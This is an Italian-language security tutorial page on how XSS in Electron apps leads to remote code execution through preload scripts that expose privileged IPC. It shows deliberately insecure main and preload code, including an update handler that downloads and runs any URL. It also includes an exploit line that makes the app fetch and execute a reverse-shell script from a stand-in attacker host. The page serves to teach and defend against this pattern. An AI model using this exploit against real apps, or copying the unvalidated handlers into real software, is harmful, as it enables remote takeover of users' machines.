# Electron contextIsolation RCE via IPC

{{#include ../../banners/hacktricks-training.md}}

La context isolation non rende sicuro un bridge preload non sicuro. Se un preload espone IPC privilegiato ai contenuti del renderer, un XSS o un renderer compromesso può chiamare quel bridge; l’RCE dipende quindi dalla convalida e dalle funzionalità del corrispondente handler nel processo principale. Electron consiglia di esporre un solo metodo circoscritto per ogni operazione, convalidare i mittenti IPC e non esporre mai primitive IPC grezze.<sup>[[3]](#references)[[4]](#references)</sup>

**La maggior parte di questi esempi è stata presa da qui** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Guarda il video per ulteriori informazioni.<sup>[[1]](#references)</sup>

## Esempio 0

Esempio tratto da [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (in queste slide trovi l’esempio completo di come MS Teams è stato compromesso, passando da XSS a RCE; questo è solo un esempio molto basilare):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Esempio 1

Controlla come `main.js` si mette in ascolto su `getUpdate` e **scarica ed esegue qualsiasi URL** venga passato.\
Controlla anche come `preload.js` **espone qualsiasi evento IPC** del processo principale.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Esempio 2

Se il preload espone `shell.openExternal` senza convalidare schema e destinazione, un input controllato dal renderer può avviare gestori esterni registrati. La possibilità che ciò comporti l'esecuzione di codice dipende dalla piattaforma, dai gestori installati, dallo schema e dalla versione di Electron; limita l'accesso a un'allowlist esplicita delle destinazioni `https:` previste.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Esempio 3

Se il preload espone una comunicazione senza restrizioni con il processo principale, un XSS può inviare nomi di canali e dati arbitrari. L'impatto dipende dagli handler IPC registrati e dai relativi controlli di autorizzazione.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Hacking delle app desktop moderne con XSS e RCE: workshop](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Come ho hackerato Microsoft Teams e ottenuto $150.000 in Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — Checklist di sicurezza](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — Isolamento del contesto ed esposizione sicura delle API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
